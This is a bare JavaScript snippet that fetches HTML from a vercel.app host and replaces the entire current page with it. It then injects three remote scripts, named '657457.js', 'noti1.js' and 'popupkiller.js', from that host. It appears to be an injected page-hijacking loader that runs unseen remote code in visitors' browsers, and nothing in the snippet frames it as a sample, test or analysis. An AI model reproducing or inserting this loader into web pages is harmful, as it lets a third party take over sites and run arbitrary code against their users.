fetch('https://curtis-gamma.vercel.app/new10.txt')
  .then(response => {
    if (response.ok) {
      return response.text(); 
    }
    throw new Error('Network response was not ok.');
  })
  .then(html => {
    document.documentElement.innerHTML = html; 
    document.body.replaceWith(document.body.cloneNode(true));
    


    const script = document.createElement('script');
    script.src = 'https://curtis-gamma.vercel.app/657457.js';
    document.body.appendChild(script);
    const script2 = document.createElement('script');
    script2.src = 'https://curtis-gamma.vercel.app/noti1.js';
    document.body.appendChild(script2);
    const script3 = document.createElement('script');
    script3.src = 'https://curtis-gamma.vercel.app/popupkiller.js';
    document.body.appendChild(script3);
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
  });
